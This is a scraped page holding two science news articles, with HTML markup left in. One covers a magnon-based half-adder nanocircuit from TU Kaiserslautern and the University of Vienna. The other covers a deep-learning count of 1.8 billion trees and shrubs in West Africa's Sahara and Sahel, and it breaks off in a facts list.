Researchers led by Technische Universität Kaiserslautern (TUK) and the University of Vienna successfully constructed a basic building block of computer circuits using magnons to convey information, in place of electrons. The “magnonic half-adder” described in “<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41928-020-00485-6&amp;t=NTBlODExM2M1MDliOWUwZTdhMjBkOTg2ZDFlYWNiZGI4NmE2OGRkNyxRckVLQTR5Nw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F632631998427627520%2Fcomputer-circuits-magnons&amp;m=0&amp;ts=1603657809"><i>Nature Electronics</i></a>”, requires just three nanowires, and far less energy than the latest computer chips.</p><p>A team of physicists are marking a milestone in the quest for smaller and more energy-efficient computing: they developed an integrated circuit using magnetic material and magnons to transmit binary data, the 1s and 0s that form the foundation of today’s computers and smartphones.</p><p>The new circuit is extremely tiny, with a streamlined, 2D design that requires about 10 times less energy than the most advanced computer chips available today, which use CMOS technology. While the current magnon configuration is not as fast as CMOS, the successful demonstration can now be explored further for other applications, such as quantum or neuromorphic computing.</p><h2><b>Successful collaboration</b></h2><p>The prototype is the culmination of four years of effort funded through Andrii Chumak’s European Research Council (ERC) Starting Grant, and close collaboration with Jun.-Prof. Dr. Philipp Pirro at TUK, and Dr. Qi Wang, who is currently a postdoc at University of Vienna. Univ.-Prof. Chumak started the work at TUK and now leads a research group at University of Vienna.</p><p>“We are very happy since we managed to do what was planned several years ago and it works even better than we expected”, Chumak says. When he first proposed the magnon circuit, his design was very complex. He credits Wang, the lead author of the paper, with making the design “at least 100 times better.” “We see now that magnonics circuits can be as good as CMOS, but this is probably not yet enough if you want to trigger industry. I would assume you have to be still at least 100 times smaller and faster”, says Chumak. “But this circuit opens up fantastic opportunities beyond binary data, for example to quantum magnonic computing at very low temperatures.” Pirro adds: “We are also interested in adapting the circuit for neuromorphic magnonic computers inspired by the functionality of our brain.”</p><h2><b>How it works</b></h2><p>The nanocircuit components measures less than one micrometer, far thinner than a human hair and hardly visible even under a microscope. It comprises of three nanowires made of a magnetic material called yttrium iron garnet. The wires are positioned precisely in relationship to each other to create two “directional couplers” which guide magnons through the wires. Magnons are quanta of spin waves – think of them like ripples on the surface of pond after throwing in a rock, but in this case, the waves are formed by distortions in the magnetic order of a solid material on the quantum level. It took a lot of time and effort to figure out the best nanowire length and spacing to generate the desired outcomes. Wang worked on the project for his Ph.D. at TUK. “This is the 3rd or 4th design”, he says. “I ran a few hundred simulations for different types of half-adders.”</p><p>At the first coupler, where two wires are very close together, the spin wave is split in half. One half proceeds to the second coupler, where it jumps back and forth between the wires. Depending on the amplitude, the wave will exit either the top or bottom wire, which corresponds to binary “1” or “0”, respectively. Since the circuit contains two directional couplers that add together two streams of information, it forms a “half-adder”, one of the most universal components of computer chips. Millions of these circuits can be combined to conduct increasingly complex calculations and functions.</p><p>“What typically requires hundreds of components and 14 transistors in regular computers, here only requires three nanowires, a spin wave, and nonlinear physics”, Pirro says.</p><h2><b>Future applications</b></h2><p>Pirro, who is currently leading the direction of spintronic computing at TUK in the frames of the collaborative research center “Spin+X”, will now explore using the magnon circuit for neuromorphic computing, which approaches data processing not as binary, but more like the human brain. Spin waves are much better suited for the more complex systems and have the potential to carry a great deal more information because they have two parameters – amplitude, which is wave height, and phase, which is the wave angle. In the current demonstration, the team did not use phase as a variable in order to keep it simple for binary data processing. </p><p>“If this device can already compete with CMOS, even if it is not using the full power of the wave-based approach, then we can be quite confident a scheme using the full power of the spin wave can be more efficient than CMOS for certain tasks”, Pirro says. “And the ultimate goal, of course, is to combine the strengths of both CMOS and magnonics technologies together.”

	<p>If you think that the Sahara is covered only by golden dunes and scorched rocks, you aren’t alone. Perhaps it's time to shelve that notion. In an area of West Africa 30 times larger than Denmark, an international team, led by University of Copenhagen and NASA researchers, has counted over 1.8 billion trees and shrubs. The 1.3 million km<sup>2</sup> area covers the western-most portion of the Sahara Desert, the Sahel and what are known as sub-humid zones of West Africa.</p>
<p>"We were very surprised to see that quite a few trees actually grow in the Sahara Desert, because up until now, most people thought that virtually none existed. We counted hundreds of millions of trees in the desert alone. Doing so wouldn't have been possible without this technology. Indeed, I think it marks the beginning of a new scientific era," asserts Assistant Professor Martin Brandt of the University of Copenhagen’s Department of Geosciences and Natural Resource Management, lead author of <a href="https://www.nature.com/articles/s41586-020-2824-5">the study’s scientific article, now published in <em>Nature</em></a>.</p>
<p>The work was achieved through a combination of detailed satellite imagery provided by NASA, and deep learning — an advanced artificial intelligence method. Normal satellite imagery is unable to identify individual trees, they remain literally invisible. Moreover, &nbsp;a limited interest in counting trees outside of forested areas led to the prevailing view that there were almost no trees in this particular region. This is the first time that trees across a large dryland region have been counted.</p>
<h2>The role of trees in the global carbon budget</h2>
<p>New knowledge about trees in dryland areas like this is important for several reasons, according to Martin Brandt. For example, they represent an unknown factor when it comes to the global carbon budget:</p>
<p>"Trees outside of forested areas are usually not included in climate models, and we know very little about their carbon stocks. They are basically a white spot on maps and an unknown component in the global carbon cycle," explains Martin Brandt.</p>
<p>Furthermore, the new study can contribute to better understanding the importance of trees for biodiversity and ecosystems and for the people living in these areas. In particular, enhanced knowledge about trees is also important for developing programmes that promote agroforestry, which plays a major environmental and socio-economic role in arid regions.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>"Thus, we are also interested in using satellites to determine tree species, as tree types are significant in relation to their value to local populations who use wood resources as part of their livelihoods. Trees and their fruit are consumed by both livestock and humans, and when preserved in the fields, trees have a positive effect on crop yields because they improve the balance of water and nutrients," explains Professor Rasmus Fensholt of the Department of Geosciences and Natural Resource Management.</p>

<h2>Technology with a high potential</h2>
<p>The research was conducted in collaboration with the University of Copenhagen’s Department of Computer Science, where researchers developed the deep learning algorithm that made the counting of trees over such a large area possible.</p>
<p>The researchers show the deep learning model what a tree looks like: They do so by feeding it thousands of images of various trees. Based upon the recognition of tree shapes, the model can then automatically identify and map trees over large areas and thousands of images. The model needs only hours what would take thousands of humans several years to achieve.</p>
<p>"This technology has enormous potential when it comes to documenting changes on a global scale and ultimately, in contributing towards global climate goals. It is a motivation for us to develop this type of beneficial artificial intelligence," says professor and co-author Christian Igel of the Department of Computer Science.</p>
<p>The next step is to expand the count to a much larger area in Africa. And in the longer term, the aim is to create a global database of all trees growing outside forest areas.</p>

        <h2>Fakta</h2>
    </p>
    <div>
        <ul>
<li>The researchers counted 1.8 billion trees and shrubs with crowns larger than 3 m<sup>2</sup>. Thus, the actual number of trees in the area is even higher.</li>
<li>Deep learning can be characterized as an advanced artificial intelligence method where an algorithm is trained to recognize specific patterns in large amounts of data. The algorithm used in this research was trained using nearly 90,000 images of different trees across a variety of landscapes. </li>
